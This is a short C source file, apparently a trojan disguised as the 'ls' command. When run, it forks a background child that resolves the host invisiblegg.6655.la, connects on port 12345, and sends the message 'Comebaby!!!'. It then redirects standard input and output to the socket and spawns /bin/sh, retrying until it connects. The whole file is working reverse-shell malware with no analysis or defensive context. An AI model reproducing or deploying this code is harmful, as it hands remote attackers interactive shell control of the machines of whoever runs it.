#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>

int hk();
void hk2();

int main(int argc,char *argv[])
{
	FILE *fp = popen("ps -e | grep \'\\<ls\\>\' | awk \'{print $1}\'", "r");
	char buffer[10] = {0};
	int n=0,m=0;
	while(NULL != fgets(buffer,10,fp))
	{
		if(buffer[m] != getpid())
		{
			n++;
		}
		m++;
	}
	if(n<=1)
	{
		hk();
	}
	pclose(fp);
	return 1;
}

int hk()
{
	pid_t pid;
	pid=fork();
	if(pid == 0)
	{
		hk2();
	}
}

void hk2()
{
	char shell[]="/bin/sh";
	char message[]="...........................\nComebaby!!!\n...........................\n";
	int sock;

	struct hostent *h;
	h=gethostbyname("invisiblegg.6655.la");
	char *abc = inet_ntoa(*((struct in_addr *)h->h_addr));

        struct sockaddr_in server;
        if((sock = socket(AF_INET,SOCK_STREAM,0)) == -1)
	{
		exit(-1);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi("12345"));
	server.sin_addr.s_addr = inet_addr(abc);
        if(connect(sock,(struct sockaddr *)&server,sizeof(struct sockaddr)) == -1)
	{
		sleep(5);
		hk2();
	}
	send(sock, message, sizeof(message), 0);
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);
	execl(shell,"/bin/sh",(char *)0);
	close(sock);
	hk2();
}

